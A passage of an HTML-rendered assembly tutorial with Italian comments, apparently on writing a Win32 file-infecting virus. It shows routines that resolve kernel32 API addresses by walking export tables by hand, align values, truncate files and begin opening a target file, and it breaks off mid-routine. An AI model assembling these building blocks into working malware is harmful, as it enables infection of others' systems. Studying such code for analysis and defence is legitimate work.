normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>xor<span style="mso-spacerun: yes">     </span>ebx,ebx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@_3:<span style="mso-spacerun: yes">    </span>lodsd<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>esi<span
style="mso-spacerun: yes">      </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>add<span style="mso-spacerun: yes">     </span>eax,[ebp+kernel]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>esi,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>mov<span style="mso-spacerun:
yes">     </span>edi,edx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>push<span style="mso-spacerun: yes">    </span>ecx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>cld<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>rep<span style="mso-spacerun: yes">     </span>cmpsb<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>pop<span style="mso-spacerun: yes">     </span>ecx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>jz<span style="mso-spacerun:
yes">      </span>@_4<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>pop<span style="mso-spacerun:
yes">     </span>esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'>inc<span style="mso-spacerun: yes">     </span>ebx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'><span style="mso-spacerun: yes">        </span>jmp<span
style="mso-spacerun: yes">     </span>@_3<span style="mso-spacerun:
yes">              </span><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'>@_4:<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'><span style="mso-spacerun: yes">        </span>pop<span
style="mso-spacerun: yes">     </span>esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'><span style="mso-spacerun: yes">        </span>xchg<span
style="mso-spacerun: yes">    </span>eax,ebx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'><span style="mso-spacerun: yes">        </span>shl<span
style="mso-spacerun: yes">     </span>eax,1<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'><span style="mso-spacerun: yes">        </span>add<span
style="mso-spacerun: yes">     </span>eax,dword ptr [ebp+OrdinalTableVA]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>xor<span style="mso-spacerun: yes">     </span>esi,esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>xchg<span style="mso-spacerun:
yes">    </span>eax,esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>lodsw<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>shl<span style="mso-spacerun: yes">     </span>eax,2<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>add<span style="mso-spacerun: yes">     </span>eax,dword ptr
[ebp+AddressTableVA]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>mov<span style="mso-spacerun: yes">     </span>esi,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>lodsd<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span>add<span style="mso-spacerun:
yes">     </span>eax,[ebp+kernel]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><span
style="mso-spacerun: yes">        </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'>GetAPI<span style="mso-spacerun: yes">         
</span>endp<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=DE
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=DE
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:DE'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=FR
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:FR'>; ROUTINE K32: IL KERNEL<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; ROUTINE GETAPI:
GLI INDIRIZZI DELLE API<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; Il codice di cui
sopra è già stato visto prima.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>; input:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>;<span style="mso-spacerun: yes">     
</span>EAX – Valore da allineare<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>;<span style="mso-spacerun: yes">     
</span>ECX – Fattore di allineamento<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>; output:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>;<span style="mso-spacerun: yes">     
</span>EAX – Valore Allineato<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>Align<span style="mso-spacerun: yes">          
</span>proc<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>edx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>xor<span style="mso-spacerun: yes">     </span>edx,edx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>div<span style="mso-spacerun: yes">     </span>ecx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>pop<span style="mso-spacerun: yes">     </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>sub<span style="mso-spacerun: yes">     </span>ecx,edx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>add<span style="mso-spacerun: yes">     </span>eax,ecx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>pop<span
style="mso-spacerun: yes">     </span>edx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>Align<span
style="mso-spacerun: yes">           </span>endp<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>questa è la
procedura di allineamento.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>; input:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>;<span style="mso-spacerun: yes">     
</span>ECX - dove troncare<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span></span><span lang=EN-US style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF;mso-ansi-language:
EN-US'>; output:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes"> </span>;<span style="mso-spacerun: yes">      </span>Nulla.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='font-size:9.0pt;mso-bidi-font-size:10.0pt;
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'>TruncFile<span
style="mso-spacerun: yes">       </span>proc<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='font-size:9.0pt;mso-bidi-font-size:10.0pt;
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">        </span>xor<span style="mso-spacerun:
yes">     </span>eax,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='font-size:9.0pt;mso-bidi-font-size:10.0pt;
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='font-size:9.0pt;mso-bidi-font-size:10.0pt;
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='font-size:9.0pt;mso-bidi-font-size:10.0pt;
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>ecx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='font-size:9.0pt;mso-bidi-font-size:10.0pt;
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>dword ptr [ebp+FileHandle]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='font-size:9.0pt;mso-bidi-font-size:10.0pt;
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">        </span>call<span style="mso-spacerun:
yes">    </span>[ebp+_SetFilePointer]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='font-size:9.0pt;mso-bidi-font-size:10.0pt;
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='font-size:9.0pt;mso-bidi-font-size:10.0pt;
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">        </span>push<span style="mso-spacerun:
yes">    </span>dword ptr [ebp+FileHandle]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='font-size:9.0pt;mso-bidi-font-size:10.0pt;
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">        </span>call<span style="mso-spacerun:
yes">    </span>[ebp+_SetEndOfFile]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='font-size:9.0pt;mso-bidi-font-size:10.0pt;
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'><span
style="mso-spacerun: yes">        </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='font-size:9.0pt;mso-bidi-font-size:10.0pt;
mso-fareast-font-family:"MS Mincho";color:#CCFFFF;mso-ansi-language:EN-US'>TruncFile<span
style="mso-spacerun: yes">       </span>endp<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; La funzione SetFilePointer
muove il file pointer di un file aperto.<span style="mso-spacerun: yes">     
</span><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>; input:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>;<span style="mso-spacerun: yes">     
</span>ESI – Puntatore al file da aprire<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>; output:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>;<span style="mso-spacerun: yes">     
</span>EAX - File handle<span style="mso-spacerun: yes">  </span>(se va tutto
bene)<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>OpenFile<span style="mso-spacerun: yes">       
</span>proc<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>xor<span style="mso-spacerun: yes">     </span>eax,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>00000003h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>inc<span style="mso-spacerun: yes">     </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
